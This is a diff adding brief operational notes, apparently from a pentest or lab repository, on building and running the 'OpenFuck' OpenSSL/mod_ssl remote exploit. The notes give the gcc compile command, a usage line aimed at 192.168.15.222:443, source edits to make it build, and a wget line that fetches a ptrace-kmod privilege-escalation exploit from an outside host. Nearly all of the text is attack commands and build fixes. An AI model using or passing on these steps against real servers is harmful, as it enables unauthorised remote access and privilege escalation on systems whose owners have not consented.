@@ -1,0 +1,27 @@
+Compile command:
+
+gcc -o OpenFuck ./openfuck.c -lcrypto
+
+Use command:
+
+./OpenFuck 0x73 192.168.15.222 443
+
+
+Original Exploit Location:
+
+
+
+Changes from original:
+
+#include <openssl/rc4.h>
+#include <openssl/md5.h> 
+
+Add "const" to line 961:
+
+const unsigned char *p, *end;
+
+This the following wget command fails, but non-root (apache) access is still achievable
+
+wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+
+
